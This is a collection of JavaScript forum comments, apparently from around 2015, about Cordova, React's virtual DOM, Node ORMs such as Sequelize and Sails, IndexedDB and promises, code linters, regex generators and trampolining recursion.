My team has built quite a few nice apps with Cordova. It's not the easiest thing in the world, but you can get great performance. The UI is rarely an issue and with some eye on design and clever coding you can get around that easily. The closest saying I've heard is you don't write your app once, use it on both Android and iOs - it's write your app 1.5 times. You have to do a lot of performance related things, and jump through some hoops for iOs or Samsung devices. I will concur that older android devices are slow as hell with these apps though. All that being said - we are considering training up our team into both iOs and Android, but that greatly slows down our development speed and our clients tend to want things way too damned fast (marketing agency).
I've also worked in this area. My experience with Cordova is not that there is a problem with the tool itself just that all you are doing is wrapping a webview in an interop shell and the webview tends to be many versions behind the real browser on that OS. Also CSS animations will never compare to native regardless of hardware simply because they are not optimized. Cordova is a great free tool but I seriously consider it more of a temporary patch until a tool such as Resct-native matures.
I agree. The to be continued part left a bad taste in my mouth. Pretty pointless post.
Try control-shift-J to access the debugger. You will want to become very familiar with the debugging tools in Chrome or Firefox/Firebug. You can also use process of elimination to make debugging simpler. Comment all of your code and just try to get this working: console.log("Hi'); If you can't/don't want to use the debugger, you can always debug using console.log(somevariablename); You can also get set up with a unit testing system like TDD/BDD. Google 'TDD in browser' or 'BDD in browser'). You will have to get some or all of these debugging/development techniques down in order to write even a simple program. A debugger will allow you to step through your code and see the current state of each variable and the result of each statement in your program. Creating unit tests as you develop will be even better because it will allow you to test your code automatically later after you make changes. Maybe google for 'JavaScript Chrome debugger tutorial' or something like that.
I bet if you ask nicely, the creator would tell you exactly the technology stack he used.
I've not used firebase at this point but anything that moves people closer to cursors and immutable data in general is great in my opinion. This is another side effect of react that people don't pick up on right away when they read about it. I can technically re-render a number of times and react will only actually update the smallest part of the dom necessary, *but* by simply switching to an immutable data set I can also prevent react from even calling render at all based on a simple reference equality check (regardless or how complex or deeply nested a glob I am passing down through the hierarchy). Someday react will be replaced as well, but I hope at a minimum these core concepts carry through as the way forward for client side apps. 
Was the big word 'virtual' or 'dom'? I kid :p you have to give him credit even if the post has no actual information because the article was written in the last two weeks, is about react, and it didn't use the word 'isomorphic' which seems to be quite the feat these days. (unless I missed it, which is possible because I was on autopilot waiting for what I am missing, and I seemed to have missed that part as well). 
Agreed. People should just click "report" when something is clearly low-content self-promotional huffle.
Sound Script has language constructs that are not values on the language. It is much more like Java than JavaScript :( :( :(
I would argue with the current state of things, on the client side, ARM *is* replacing x86
Petition the W3C? 
Database with forms basic CRUD live updates with ajax etc. Hard to go into more detail without knowing your background and knowledge level.
Not everything should be made with React.
Look up the new and free regex generator that was released several weeks ago from Machine Learning Lab (http://regex.inginf.units.it/). http://www.reddit.com/r/programming/comments/2q266z/regex_generator_a_webtool_for_generating_regular/ It's based on genetic algorithms. Many times, you have to come up with the pattern yourself. With the new generator, you submit a string, highlight what you want to match (in this case, highlight several IP addresses), wait for the program to run, and it generates a regular expression pattern for you. It takes some time, as it has try many different combinations to meet your goal. It learns and optimizes every time.
The [Webix DataTable component is far faster than ExtJS](http://webix.com/widget/datatable/)'s equivalent.
Don't forget functional. It's everything to everyone.
Complety depends what you're doing. If you're writing a game, your HTML might be just one big canvas, and everything else is WebGL or plain old 2d, all in JS.
There are a bunch of [alternatives to ExtJS](https://stackoverflow.com/questions/200284/what-are-alternatives-to-extjs), but almost all of them have separate controls for desktop vs. mobile browsers. The notable exception is [Webix](http://webix.com), which lets you develop complex mobile web apps with desktop controls adapted for mobile (e.g. long lists with kinetic scrolling). Here's a [demo](http://webix.com/demos/touch.html). And indeed, with any UI components framework, &gt; the sheer power it provides makes everything else, plain HTML and CSS included, look positively arcane I'm still not sure why so many developers insist of using low-level (compared to UI component libraries) HTML and CSS (and maybe Handlebars-like templates) when there are already tons of good widget libraries out there.
Firstly introducing types doesn't make it java. It is optional typing. You can have both typed and untyped code in the same file. And since it's just an experiment. For people who need speed, can use these experimental parts which might give performance boost. So, go Google!!
Sorry!
 index.html take down JS tutor for now 2 days ago https://github.com/pgbovine/OnlinePythonTutor/tree/master/v3 ?
Ah, yes, the second version syndrome... "This time we know everything, if we could just rewrite it from scratch, everything would be perfect!"
as much as i hate google's data collection practices.....chrome beats the pants off firefox. I don't see them ever recoverying.
I suppose you could treat the subtraction as an addition and do: var squaredDeviations = function(xs) { return map(compose(square, curry(add)(-mean(xs))), xs); }; The performance isn't much better (much worse than the var way) and it is harder to read. Sometimes it is possible to go too far overboard with things like compose and curry.
killing is no laughing matter.
dafuq am i supposed to do here?
its good to see so many people using material design. it looks like shit to me...
all the fb tweenies love it because its from fb. the thing i like is if i want to prototype something quick i can just start coding and drop in 1 script. but there's a lot i don't like about it to really take it seriously.
the profile work around is easy. the zip code radius is a little more difficult unless the data is already on the page. but you sound like a creep...so I'm not going to tell you how.
&gt; such as python/vim/sed/etc --- http://txt2re.com/ &gt;regular expression generator &gt;(perl php python java javascript coldfusion c c++ ruby vb vbscript j# c# c++.net vb.net) &gt; **So what does txt2re do?** &gt; &gt; This system acts as a regular expression generator. &gt; &gt; Instead of trying to build the regular expression, you start off with the string that you want to search. &gt; &gt; You paste this into the site, click submit and the site finds recognisable patterns in your string. &gt; &gt; You then select the patterns that you are interested in and it writes a fully fledged program that extracts those patterns from that string. &gt; &gt; You then copy the program into your editor or IDE and play with it to integrate it into your program. &gt; &gt; **How is this better than xyz tool?** &gt; &gt; All of the tools I have looked at start with the regular expression, and provide a graphical interface instead of a text based interface to allow you to build it. &gt; &gt; I have found using these tools to be just as difficult as typing the regular expression into an editor. &gt; &gt; I've never seen the big advantage. &gt; &gt; Txt2reg on the other hand takes a fundementally different approach - **it starts with the string to be searched**. txt2re shows you all the possible combinations of patterns that you can use after you put in a string, and you can start building the regular expression from what they show you. E.g. Using the example that they give on the page (http://txt2re.com/): 28:Nov:2014 "This is an Example!" You can press c or d to capture number two. If you press, day or 28, you shut off the option to choose d for the next character, and something like d d for 28. If you press ddmmmyyyy, it removes the option to choose something like an “int month year” combination. --- **Genetic algorithm regular expression generator** Look up the new and free regex generator that was released several weeks ago from Machine Learning Lab (http://regex.inginf.units.it/). http://www.reddit.com/r/programming/comments/2q266z/regex_generator_a_webtool_for_generating_regular/ It's based on genetic algorithms. Many times, you have to come up with the pattern yourself. With the new generator, you submit a string, highlight what you want to match (in this case, highlight several IP addresses), wait for the program to run, and it generates a regular expression pattern for you. It takes some time, as it has try many different combinations to meet your goal. It learns and optimizes every time.
http://txt2re.com/ &gt;regular expression generator &gt;(perl php python java javascript coldfusion c c++ ruby vb vbscript j# c# c++.net vb.net) &gt; **So what does txt2re do?** &gt; &gt; This system acts as a regular expression generator. &gt; &gt; Instead of trying to build the regular expression, you start off with the string that you want to search. &gt; &gt; You paste this into the site, click submit and the site finds recognisable patterns in your string. &gt; &gt; You then select the patterns that you are interested in and it writes a fully fledged program that extracts those patterns from that string. &gt; &gt; You then copy the program into your editor or IDE and play with it to integrate it into your program. &gt; &gt; **How is this better than xyz tool?** &gt; &gt; All of the tools I have looked at start with the regular expression, and provide a graphical interface instead of a text based interface to allow you to build it. &gt; &gt; I have found using these tools to be just as difficult as typing the regular expression into an editor. &gt; &gt; I've never seen the big advantage. &gt; &gt; Txt2reg on the other hand takes a fundementally different approach - **it starts with the string to be searched**. txt2re shows you all the possible combinations of patterns that you can use after you put in a string, and you can start building the regular expression from what they show you. E.g. Using the example that they give on the page (http://txt2re.com/): 28:Nov:2014 "This is an Example!" You can press c or d to capture number two. If you press, day or 28, you shut off the option to choose d for the next character, and something like d d for 28. If you press ddmmmyyyy, it removes the option to choose something like an “int month year” combination. --- **Genetic algorithm regular expression generator** Look up the new and free regex generator that was released several weeks ago from Machine Learning Lab (http://regex.inginf.units.it/). http://www.reddit.com/r/programming/comments/2q266z/regex_generator_a_webtool_for_generating_regular/ It's based on genetic algorithms. Many times, you have to come up with the pattern yourself. With the new generator, you submit a string, highlight what you want to match (in this case, highlight several IP addresses), wait for the program to run, and it generates a regular expression pattern for you. It takes some time, as it has try many different combinations to meet your goal. It learns and optimizes every time.
This. A board can't compete with a community.
I'd be interested in some of the challenges you faced in the future post. :)
We are in agreement. 
I hope you're being sarcastic. 
I'm tentatively excited by this, can anyone recommend anything to read / learn in the space between now and when this is released? Xcode seems so daunting to me.
Your question isn't very clear. If you want to "inject" HTML into a node directly, it goes completely against react principle. The content of any node should be defined by one or multiple functions, eg: &lt;div&gt;{this.isActive() ? 'Disable' : 'Enable'}&lt;/div&gt; Can you give us a more specific example of what you'd want to do?
It would be equivalent to direct injection of code, but under the surface would make partial changes. For example, if the HTML it was being changed to only differed in two elements, it would make the individual changes to those elements. The result would be the same in terms of the eventual HTML, but (if my line of reasoning is correct) the browser would have needed to go through less effort.
I typed [my response](http://www.reddit.com/r/javascript/comments/2v30fw/a_question_about_react/coe133f) in the wrong box.
The pain with RequireJS is the paths config.. Once you figure it out, you'll be able to make it work but it still not going to ring right in your head. We also do server-side rendering. It just took an extra 30 minutes to setup because of the whole requireJS thing. My advice: change to commonJS style include before it's too late (before you have 700+ js files, like me!) No worries about the late reply, let me know if you want to know anything else. 
I think you misunderstand the shadow DOM. The point of it is to be very minimalistic compared to a real DOM. A shadow DOM element might look like this: { node: 'div', attrs: { className: 'someclass someother', onClick: fn(), } children: [ ... ] } A real DOM node is a scary beast. It has over 200 attributes. React can't work on something it didn't render itself because as I said, it's not possible to reconcile nodes between the real DOM and shadow DOM. For performance, first, because it's an exponentially complex operation. Secondly, because shadow DOM and real DOM are completely different. Most of the attributes of the real DOM are impossible to compute (unless you're a browser). React doesn't read DOM nodes, it only does a one way process to apply the changes it finds between it's internal representations, to the nodes identified by its mappings. I repeat, it DOES NOT rely on reading the DOM. It tells a node "here's your new innerText", or "remove this class from yourself", but it never reads this node's classes/content in the first place.
12 seconds to load 1000 rows in Chrome. So ridiculous. We show up to 200 rows and found that the ext grid will take up to 2 seconds to render, completely unacceptable.
Couldn't a shadow DOM be made as a first step? Finding out what react does is important, but I don't plan on being limited by what react does not do. Making a shadow DOM certainly seems possible, it's useful to know that's something I would need to cover if I wanted to do this using react. The jsgui controls I'm working with at the moment are a bit like a shadow DOM, except there is only a 1-1 mapping between DOM nodes and the more basic controls.
I bet you can squeeze 1k from each image instead.
The shadow DOM could be made as a first step. The problem is that you can't modify the DOM directly then, as those changes won't be taken into account. That's the power of react, trading flexibility for control. By controlling everything, it's able to determine the smallest possible change. May I ask which limitations you're talking about?
Exactly. Libraries like ExtJS aren't without their problems of course, but what they give you is worth it... I can only guess it's this whole "minimalist" fad we're stuck in that can't end soon enough IMO. If you're in the business world, where the software you produce isn't typically the end product but is in support of a core business, then something as powerful as ExtJS is an incredible tool to have at your disposal. The story might be a bit different if the software IS the product though. 
&lt;div dangerouslySetInnerHTML={{__html: 'First &amp;middot; Second'}} /&gt; ? http://facebook.github.io/react/docs/jsx-gotchas.html
I am not arguing that Cordova is the problem. It is definitely an amazingly innovative solution to a very hard problem. I just think that until Android follows Apple into improving their integrated webview it will never compete with native. Also most customers want native looking apps, it is hard to accomplish that with CSS due to the fact native transitions are complex and highly optimized.
Also on Android, I don't see why it would not be possible to make ones own webview component - though that's not about using Cordova, it's about how Cordova could be improved. If there was an open source version of Firefox for Android (maybe there is, I don't know), it could be re-purposed for browsing a single application. It looks like Mozilla is trying to do that with (GeckoView)[https://wiki.mozilla.org/Mobile/GeckoView], but it's not production ready. They say 'It is currently possible to load webpages, but that's about it'.
Why are you calling replaceWith on $(txt)? Don't you want to replace the character in $(".text")? Why do you have a while loop being called i times, but never using i within your loop such that the loop does something different each time?
There is if you use --harmony
&gt; My team has built quite a few nice apps with Cordova. how big is your team and how long does it take to build an app?
A very good node ORM is waterline, it's used heavily in conjunction with sails.js Both are on GitHub, waterline uses the q library to do its promises and makes for a very awesome experience. 
Some app teams are one person big. Biggest app team we've had is three people. Typically one to three month turn around for web plus android plus iOS versions. We're a nascent digital department at a marketing company. Side note. Temple Run 2 is phonegap as well IIRC.
Is $('.text') an input? If not, then it should be .html() instead of .val(). var word = $(".text").html(); word = word[1] + word.substr(1); $(".text").html(word); No need to iterate over the length of the word. Also, `txt` wouldn't be a jquery object in this case, just a string so calling $(txt) doesn't do anything. `.replaceWith(value)` is meant to replace a DOM element with `value`.
If thinking of pure-browser, I don't think it's doable. You would need to use some kind of an extension mechanism to render the additional cursor and to perform actions the other user does.
I use Bookshelf or Knex on a few different projects, and it's very painless. I've also used waterline as mentioned by BatsForCats, but only with Sails development. Personal experience would lead me to tell you to give Bookshelf a shot as it's very straightforward and doesn't force you to use Q (do people still use that over bluebird anyways?), but being that I haven't tried using Sequelize, it may be the wrong advice. 
I'm struggling too find documentation on actual information. Like how to map properties to columns, or examples beyond the most basic one file apps.
I'd imagine it will be released in the next month of or so (can anyone weigh in on this?). I'd spend your time learning as much React as possible to make it easier on yourself once it enters wide release. 
actually I just figured it out, thank you for your help and reminding me that I was over thinking.
Do you mean you want it to look like the string is disappearing? I think if you give an example with an example string then it would be easier to help you.
Splitting things into files doesn't achieve anything by itself. Doing so is like splitting a function into smaller functions that still fundamentally depend on each other because you heard that you're supposed to keep functions as small as possible; it just creates indirection. What you're really trying to do is group up related code into files (and functions, to continue that example) in a way that is as insulated as possible from side-effects in other files (and functions). Splitting HTML from the JS that depends on it (and vice versa) moves the needle away from this goal. See, we've been trying to split our UIs apart by components (html + js, i.e. logical silos) for some time now. Examples: - http://www.x-tags.org/ - http://webcomponents.org/ - https://www.polymer-project.org/ The idea is that you can drop this into your UI: &lt;news-feed feed-items={{ feedItems }}&gt;&lt;/news-feed&gt; And maintain the entire component in `components/news_feed.file`. If you want to change the presentation of a feed item, you edit that file. If you want to add and link up a "Create Item" button, you edit that file. It's nicely contained. React's one-way flow of data is what makes component-level silos particularly nice to work with since there's a clear counter-pressure to making components arbitrarily communicate with each other (which doesn't exist when it's just you and jQuery soup). For example, the most naive way to implement state changes in a React component is to pass in a function that handles the state change: &lt;news-feed feed-items={{ feedItems }} add-feed-item={{ addFeedItem }}&gt;&lt;/news-feed&gt; Now the component can just call `addFeedItem(item)` when a user clicks its submit button. Some global coordinator that implmements `addFeedItem` might do something like post the item to the server and update the list of `feedItems` which is passed back into `&lt;news-feed&gt;` triggering its re-render without that component ever needing to know how or why. Hope that makes sense. Yeah, it seems weird at first to "mix" html and js, but I'd wager that mixing html and js was never the problem - the problem really always came from when we arbitrarily mix pockets of global and local statefulness across our app, and then write our js so that it has to be omniscient of all these pockets so that it can coordinate them.
No, unfortunately. The best you can do is find a _good_ scrolling library and use that, but it won't match the arrow keys.
Can you point me at documentation beyond what's on the bookshelfjs site? I can't seem to find anything on mapping objects -&gt; tables, nor can I find anything which shows best practices on implementation. The very few examples are all "lets cram everything into app.js"
I've used https://github.com/dresende/node-orm2 , which I thought was quite nice. On Sequelize, I found the documentation to be really incorrect, and wasn't able to get anything done with it because of that.
Columns are mapped to properties automatically (a la activerecord), so if you create a migration that adds a column named first_name, you would then be able to do new MyModel({ first_name: "Joe" }). As for how to structure it within your app, I'd say that's a bigger concern than the ORM itself. If you're looking to use a limited structure framework like Express, I'd recommend taking a look at how some of the more structured ones setup the file structure and dependency management / module loading, or consider something built on top of Express to solve this problem like Kraken. Cheers!
Also for Bookshelf in particular it may be worthwhile to read up on Backbone as its heavily influenced by their model layer and even depends on it for various things. 
... what the fuck, you still need the damn flag?!? GOD DAMN IT
Really liking sequelize
I used Sequelize a few years ago and it seemed pretty good. 
As someone using Sails in production, I highly recommend you do not use it. While the sails team has done a great job with sails vs. other developers, sails is still very buggy as is and is missing a ton of core functionality in waterline (that an ORM should have). Sails has tons of bugs, and the sails team isn't particularly fast with regards to development. I hope this doesn't come across as too ungrateful - I have a lot of respect for people who develop open source software, but that doesn't mean I don't get to criticize their work. If you're just writing an API, sails is going to be overkill and won't have the feature depth you'll end up needing. Some things missing from sails.js + Waterline PostgreSQL: * NO DB JOINS; they're all handled in application memory. * Advanced/complex queries beyond the relationships (no ability to adjust join depth, so you always have to run multiple queries for complex joins) * NO TRANSACTIONS * NO CACHING LAYER IMO sails is over engineered for starting up and falls flat on its face once you need to use it for anything more complex than counting the number of dogs Sally has. Don't be fooled by the simple bootstrap - it's only good for about 1% of your eventual use cases unless you're building the world's simplest CRUD app. Just use Sequelize and Express (I prefer Koa) and you'll have a much better time. You can definitely find a bootstrap repo for this too... One that'll autoload models, etc. because that's one of the only things you'll miss about sails. Source: been using sails for over a year (up to date with v0.11) and every time I run into a complicated problem I have to solve it in a complicated and messy way. It's just not worth the hassle. It's nice that they configure a lot of the bootstrap but that's not going to make up for the time you'll waste coming up with solutions to that join problem you'll have.
I greatly appreciate this. Nice to have somebody who's used it telling me not use something :)
That is an interesting idea. My only concern is that it would drastically increase the app file size. If a native app does a certain function at 200kb and the custom web view solution requires a minimum file size of 10mb regardless of your intentions I would venture to say it isn't worth it. The great thing about Cordova is that you can minimize the app file size, whereas other cross platform solutions bundle a lot of heavy, bloated dependencies. 
this is so simple yet so great... thank you
have you seen http://bookshelfjs.org and http://knexjs.org? I agree the documentation isn't amazing, it's very much at the API level, but it's not terrible.
It's possible to see the remote desktop currently but controlling the mouse is more difficult. You would have to track the relative mouse position on the viewing computer and then mirror those movements with the remote mouse. Controlling a mouse in javascript is near impossible because of the restrictions on javascript. This is why things like activex were developed. Activex has more control over your OS, but that leads to security concerns. 
Well that downside exists in most every orm, so I'm not going to get worked up about it :)
It would be a trade-off. I think it would be worth it in some cases but not others.
without `Math.random()` involved the results are similar (though io is about 2x as fast on intArrays! and marginally faster on floatArrays), just faster (I pre-seeded an array with a bunch of random numbers and plucked from that): Node version v1.1.0 fill Array: 16ms read Array: 14ms fill Int8Array: 32ms read Int8Array: 18ms fill Uint16Array: 21ms read Uint16Array: 25ms fill Float32Array: 31ms read Float32Array: 22ms fill Float64Array: 64ms read Float64Array: 90ms $ n $ node array_type_speed.js Node version v0.10.36 fill Array: 109ms read Array: 112ms fill Int8Array: 119ms read Int8Array: 114ms fill Uint16Array: 115ms read Uint16Array: 111ms fill Float32Array: 122ms read Float32Array: 445ms fill Float64Array: 183ms read Float64Array: 420ms $ n $ node array_type_speed.js Node version v0.12.0 fill Array: 16ms read Array: 22ms fill Int8Array: 44ms read Int8Array: 32ms fill Uint16Array: 49ms read Uint16Array: 39ms fill Float32Array: 40ms read Float32Array: 34ms fill Float64Array: 75ms read Float64Array: 90ms &gt; Are you using nvm to run different versions of node and io.js on the same machine? Do you have any advice about how to do that on windows? I'm using `n`, but it's the same idea as `nvm`. On windows? Run a linux VM? :D (seriously, if you're hosting anywhere it's going to be on linux anyway, may as well have a similar setup)
Any chance of a benchmark of io.js 1.0.2 please? That's the version that the benchmark I linked to indicated was slower than node 0.10.35. As for Windows, I have found it a good platform to develop node on. Maybe VMs would be better though.
Hmmmm....what about Flex?
extension is fine if that's what it takes. i just have no idea how it would happen.
I've been using Bluebird inside IndexedDB transactions. Haven't noticed any problems. What am I missing?
no
Silently down-voting a post like this is unnecessary and rude, and the frequency with which things like this occur is one reason I don't use Reddit as much as I used to.
Then you've probably not made a subsequent request against the transaction after the promise resolved? Take a look at the example in the readme. Specifically the line `.then(function(book) {`. If you where using Bluebird promises the request would still work fine (you'd get the book). But, the opened transaction would've been closed in between the time `getRecord` called `resolved` and the then-callback was called. Because an IndexedDB transaction is closed when you exit an `onsuccess` callback without making a new request (roughly speakin). But since SyncPromise resolves promises immediately the execution goes directly from the `onsuccess` function to the then-callback. This allows you to make a new request in the same transaction in the then callback.
The hint implies that something is missing.
I've found knex by itself to be a joy to work with, I havn't found bookshelf to add much value on top of knex. This may be due to the types of apps I write to make heavy use of postgis and full text search meaning I have a lot of geometry fields and custom queries.. 
I'd be interested in hearing what you find. I'm now slightly concerned that all my code is going to blow up some time in the future.
Also, they have zero documentation on unit testing. All of the testing docs are integration tests; they seem to have no idea there's a difference. Because of how waterline is structured (no real objects, promises AND deferred objects AND inline callbacks), even with `wolfpack` testing is a total pain. 
Yes. Exactly.
Yep. 
Look into [Bookends](http://city41.github.io/bookends/)
I'm going to second error handling callbacks. I love the concept but error handling is necessary.
Yep, I'm seeing the same behavior and also don't know why. Want to post it to Stack Overflow? If you don't, I might steal your example and post it myself, because I'm pretty curious. Also this general issue of the interplay between promises and IDB probably deserves some more attention. EDIT: Another bit of weirdness.. your demo works fine in Chrome even without Bluebird. It's only in Firefox that it fails. The behavior should at least be consistent across browsers with native promises!
Yes. I noticed that it works in Chrome as well. I've been reading the IndexedDB spec again I i still think Firefox is correct when it fails. I'm thinking about opening a bug report against Chrome. [This part of the IndexedDB spec](http://www.w3.org/TR/IndexedDB/#h-fire-a-success-event) specifically states that a transaction is flagged inactive immediately after `success` event has been fired on a request. To me that means that when the execution [leaves the success handlers in my example](https://gist.github.com/paldepind/abd3ce3ce5508541c77f#file-script-js-L30) then next promise call to `getByTitle` should fail since it's calling `get` on an inactive transaction. EDIT: Btw, I'm going to bed now. I'd have no problem if you posted a question to SO.
Disclosure: self-submission.
&gt; and xhp was the same concept in php My first thought seeing React is that Facebook just reinvented PHP in JavaScript. As much as PHP is derided by "serious" developers, it's been extremely successful and I think it's largely attributable to being able to manage server-side and client-side code in one file. React is the same premise just with a better implementation.
I posted: http://stackoverflow.com/questions/28388129/inconsistent-interplay-between-indexeddb-transactions-and-promises Thanks for the free Internet points :) I hope we have an answer by the time you wake up!
No, start building the new web standards from scratch. You and me and anyone who wants to join us.
The way I built it is that each public method could be used independently (not all methods require a video/audio element) and should return as soon as possible. Do you think about another approach? 
There is one major difference though and it revolves around what I said about stateful vs stateless in server side vs client in another comment. As far as I know xhp has no lifecycles and just converts xml tags to function calls to render stateless html fragments. Of course, this make sense on the server side where apart from leaky abstractions, everything is done over a stateless protocol. *But* the lifecycle of react components on the client side are one of the things that make it so great. I give it a state and props and define what it should render based on these for every possible state. It's funny how against anything like xml people are just because it was indeed a horrible format for data interchange. Turns out using it in code can be incredibly useful (and fits well when your end goal is to to render..markup :)) Programmer mentality is sort of like US politics, a constant pendulum swinging between the two big extremes and always missing the middle, where we just want to get things done and enjoy it. 
I do this a lot..
Cool just started looking into doing in for our Javascript codebase this week. We found JSHint a little too relaxed. JSCS is looking interesting.
Btw, I believe that [when][] allows you to provide a custom scheduler, which may be synchronous. It my current favorite promise implementation. [when]: https://github.com/cujojs/when
Sorry, AEM? 
Has some other cool features - such as extensibility, evaluating functions and tests that work on multiple data types. If there's anything you find missing from Joi that is a nice-to-have feel free to let me know!
Only supporting GET and POST is a deal-breaker, especially considering the [myriad](http://microjs.com/#ajax) of minimalistic request libraries in the wild. If you're really not into promises, why not use, say, superagent?
Ah... well, Adobe and "heavy" and "complicated" go hand in hand :) No, the app I'm referring to is an in-house product. As such, I can't go into too much detail... but let's just say it's conceptually similar to a portal, with lots of "components" that plug into it, but it's "similar" to a portal in the same way a bottlerocket is "similar" to an Atlas V rocket... with this app being the Atlas V :) 
I'm actually pretty pro-XML. It has a ton of features you can't replicate in json. I think I see what you're saying about the life cycle but I'm having trouble wrapping my head around it. I've read a load of fruity metaphors about what it's doing but I'd love to get an inkling of *how*. Is there a good soup-to-nuts example project out there that includes a real backend?
If you're just using Postgres as a substitute for MySQL or just a generic data store, then Sequelize is terrific. If you want to make use of any of the things that make Postgres so totally amazing, you'll probably want to write your queries yourself. Remember: Postgres can return JSON on the fly!!! Build your joins, optimize the query and BAM!!! Need to include spatial geographic data? Fine. Postgres can return GeoJSON for direct use on a web map! I definitely love Sequelize, but Postgres is so awesome, I'd ditch the ORM 7 times out of 10. 
Your getOffset method seems redundant since the object it returns is the same as what getBoundingClientRect returns. It's easier to just alias it and not waste memory on a new object. Also, you might wanna look into horizontal checks to verify if the element is in the viewport. Just my $0.02 :)
I don’t know if it hasn’t made it to the REPL or if I fundamentally misunderstand how to transpile tail calling functions into trampolining functions, but I expect this: const mapWith = (fn, [first, ...rest], prepend = []) =&gt; first === undefined ? prepend : mapWith(fn, rest, [...prepend, fn(first)]); To compile to a trampolining function. But it seems to transpile to a “plain old recursive function:” "use strict"; var _toArray = function (arr) { return Array.isArray(arr) ? arr : Array.from(arr); }; var mapWith = function (fn, _ref) { var _ref2 = _toArray(_ref); var first = _ref2[0]; var rest = _toArray(_ref2).slice(1); var prepend = arguments[2] === undefined ? [] : arguments[2]; return first === undefined ? prepend : mapWith(fn, rest, [].concat(_toArray(prepend), [fn(first)])); };
Update: It seems it is in master, but not deployed yet. Coming soon!
Coding style is a social issue. Automation can help, but depending on the level of prior agreement, or the mix of personalities on a team, it might make things worse.
The defining the rules is the social issue. Everything else about this is work whether by a human or by software.
What if a code formatter existed that did have enough options where these options can be combined in ways that achieved the rules in all those various style guides? Is that something beneficial? I am not concerned about the people who are afraid of automation. They will jump on the bandwagon the moment such a tool becomes prolific enough to enter their other various automation processes.
Yes, it would be beneficial because it is automating a manual task.
It should be noted that I left some options off to not make everything overwhelmingly frustrating for new engineers. For example, I disabled requiring minimal quotes on object keys (e.g. `{'hello': 'world'}` can be written without quotes). If there are debates on little things like that, then it is best to disable the rule where the disagreement is and move on. This is meant to help the team, not hurt it.
Ok thanks
&gt; What is the conventional way to load node modules on the client? [browserify](https://github.com/substack/node-browserify) seems to be the big one, but I'm not sure if it's compatible with require.js.
The explanation for `car` and `cdr` in Lisp come straight from the Lisp 1.5 implementation on the IBM 704. &gt; CAR/CDR is equivalent to a one-way linked list, so it's only returning pointers. When you CDR the remainder of a list, you're only getting the pointer (or value), so that's why it is fast. We agree, as the article says: &gt; Thus, an operation like `[first, ...rest] = someArray` that can be very slow with JavaScript is lightning-fast in Lisp, because `[first, ...rest]` is really a `car` and a `cdr` if our lists are chains of cons cells. Now, you say: &gt; this is not correct: oneToFive = cons(1, cons(2, cons(3, cons(4, cons(5, null))))); //=&gt; [1,[2,[3,[4,[5,null]]]]] &gt; They are not nested. The latter value is a pointer to the start of the next value, so they're strung out as a list not as a nested array. I do not understand this. There are no nested arrays in JavaScript. Arrays are represented as references, so even though we can write `[1,[2,[3,[4,[5,null]]]]]` as a literal, it is implemented as a chain of nodes just like cons cells. And the performance difference between pointers and references is not significant in this context. Where a language like C really shines for something like this is that it has structs instead of arrays. The performance difference between `a[b]` in C and `a[b]` in JavaScript is dominated by the fact that in C you’re doing a little pointer arithmetic, whereas in JavaScript you’re doing a very expensive indexed lookup. If we wanted to make a linked list fast in JavaScript, I think we’d be better off catering to inline compilation and using an object. V8 should be able to compile much faster property accessors if we are careful to cater to its accessor optimizations. But all that is beside the point. `[1, [2, [3, [4, [5, null]]]]]` behaves enough like a one-way linked list to make the exact point you are making about the fact that `cdr` is lightning-fast for a linked list and brutally slow for a vector with copying semantics.
You should take a wide view on things you can automatically check. We use scss-lint (https://github.com/causes/scss-lint). Zach holman also gave an interesting talk about [move fast &amp; break nothing](http://zachholman.com/talk/move-fast-break-nothing/) which has some good tips.
This is just my personal preferences of what I look for when I'm looking for an open source project. I thought maybe others had the same thoughts. Or maybe you disagree. That's fine, let me know.
Yes, a continuation. Node has basically been stagnant for 2 years, io is a push to get features in. I haven't seen any verbage from anyone on io that they consider the project competition, it's significantly closer to a dev version of node.
Typically, the recommendation is to use them both (JSHint/JSCS). One is dedicated to finding code errors, the other keeps everyone (you/team) coding the same way. I think the only option they share is line length.
You can wrap blocks of code to ignore JSCS (or most of these linters for that matter). It's more of an enforcer, to keep the codebase consistent. When you surf github repos, everyone's coding style is completely different. Some people use 2 spaces, others 4. It's kind of maddening, because it obfuscates the perception of code purpose. You'll spend more time getting used to a person's coding style than actually understanding their code. The idea is to reduce that issue. Code formatting tools are often pretty error prone. Even IntelliJ's formatting is descent, but when it messes up, holy shit does it mess up. There's a big difference between intention and validation.
Paste what you have here or on pastebin.com so we can take a gander. Perhaps you have no actual "code" within the file...
You forgot to recommend mongo and aws for his soon to come scaling issues
or just `python -m SimpleHTTPServer`, which should come installed.
So OSX does this thing in which it hides the actual extension of the file. Right click the file and select "Get Info". There you should be able to see its actual name, which will probably be "whatever.html.txt". Remove the ".txt".
yeah but who wants to use python when there's node? in the end `http-server .` is much easier to remember.
wat 
&gt; It allowed me to give a middle finger to CSS. It's all about inline styles. *Oppa inline-style!* (seriously it's great)
alias http-server='python -m SimpleHTTPServer'
Is it correct to assume that the formatter actually makes the changes? I rather a human, rather than a tool make code changes. The human will learn something from it.
Perhaps someone who doesn't want to install `brew`, then `node`, then `http-server`. I mean, I have no qualms with none of the aforementioned tools, but Python offers the less friction here by virtue of being bundled with the OS.
&gt; Also, if you're on a mac, you can get a simple http server running by install node. Well, OS X also has Apache installed by default. Just run "sudo apachectl start" in the terminal.
I want to build a native app for both Android and iOS as I have experience with them both but I don't really want to write 70% of the code twice so I figure I should write it in the language I know and love... JS and write the UI for Android &amp; iOS separately. 
/r/atom
I do not think that values by reference are the same thing as pointers. The simplest scheme for a reference is usually a pointer to pointer, which allows the data structure to be moved, e.g. if you have a vector that needs to be resized. When I wrote `a[b]` I did not mean accessing an arbitrary item in a linked list, I was talking about the performance of accessing the elements of a node if we choose to represent them as arrays. It’s faster in C than JavaScript, but not so much that it matters compared to the copying and allocation costs. Now I am going to get out of this conversation. I get the distinct idea that you think I’m an uninformed idiot, and where there are two ways to interpret something I write, you choose the interpretation that confirms your biased presumption that I am talking through my hat. Conversations along those lines are unproductive for the parties involved and for others wading through them. I prefer to interact with a modicum of good faith that if there is a disagreement, the parties involved are reasonable people, and that the goal is to figure out what piece of verbiage was incorrectly parsed. I am grateful to you for the original comment, it has encouraged me to rethink the way I explain the difference between a linked list and a vector, it is subject to misunderstanding. So thank you for that.
One scheme is to recompile functions that only make calls in tail position into trampolining functions: http://raganwald.com/2013/03/28/trampolines-in-javascript.html This is interoperable with "Plain Old JavaScript Functions," but it doesn't re-use the stack frame so much as return from it and then invoke another. So you get the big win of not consuming a huge amount of stack space, but not the small win of saving time setting up and tearing down stack frames. I imagine it's the best you can expect if you don't get to rewrite the engine itself.
